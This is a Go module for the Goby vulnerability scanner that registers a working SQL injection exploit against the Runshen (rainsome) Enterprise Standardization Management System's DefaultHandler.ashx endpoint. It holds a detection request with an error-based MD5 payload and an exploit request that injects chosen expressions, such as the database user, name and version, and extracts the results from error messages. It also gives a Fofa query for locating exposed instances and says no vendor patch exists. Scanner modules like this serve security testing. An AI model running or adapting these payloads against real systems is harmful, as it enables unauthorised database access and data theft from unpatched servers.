package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "rainsome Enterprise-Standardization-MS  DefaultHandler.ashx SQL Injection",
    "Description": "<p>Runshen Information Technology Enterprise Standardization Management System provides customers with various flexible standards and regulations informatization management solutions to help them realize efficient management of standards and regulations and complete the informatization construction of personalized standards and regulations database. The system is vulnerable to SQL injection. Attackers can exploit the vulnerability to obtain sensitive database information.</p>",
    "Product": "Enterprise-Standardization-MS",
    "Homepage": "http://www.rainsome.cn/",
    "DisclosureDate": "2022-11-10",
    "Author": "1angx",
    "FofaQuery": "body=\"PDCA/js/_publicCom.js\"",
    "GobyQuery": "body=\"PDCA/js/_publicCom.js\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.rainsome.cn/\">http://www.rainsome.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "exp",
            "type": "select",
            "value": "user,db_name(),@@version",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/ashx/DefaultHandler.ashx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=GetDetail&status=300&id=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/ashx/DefaultHandler.ashx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=GetDetail&status=300&id=1 and (select {{{exp}}})>0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|值 '(.*?)' 转换成数据类型"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "润申信息科技 企业标准化管理系统 DefaultHandler.ashx SQL注入漏洞",
            "Product": "企业标准化管理系统",
            "Description": "<p>润申信息科技企业标准化管理系统通过给客户提供各种灵活的标准法规信息化管理解决方案，帮助他们实现了高效的标准法规管理，完成个性化标准法规库的信息化建设。该系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"http://www.rainsome.cn/\" rel=\"nofollow\">http://www.rainsome.cn/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "rainsome Enterprise-Standardization-MS  DefaultHandler.ashx SQL Injection",
            "Product": "Enterprise-Standardization-MS",
            "Description": "<p>Runshen Information Technology Enterprise Standardization Management System provides customers with various flexible standards and regulations informatization management solutions to help them realize efficient management of standards and regulations and complete the informatization construction of personalized standards and regulations database. The system is vulnerable to SQL injection. Attackers can exploit the vulnerability to obtain sensitive database information.<br></p>",
            "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.rainsome.cn/\" rel=\"nofollow\">http://www.rainsome.cn/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}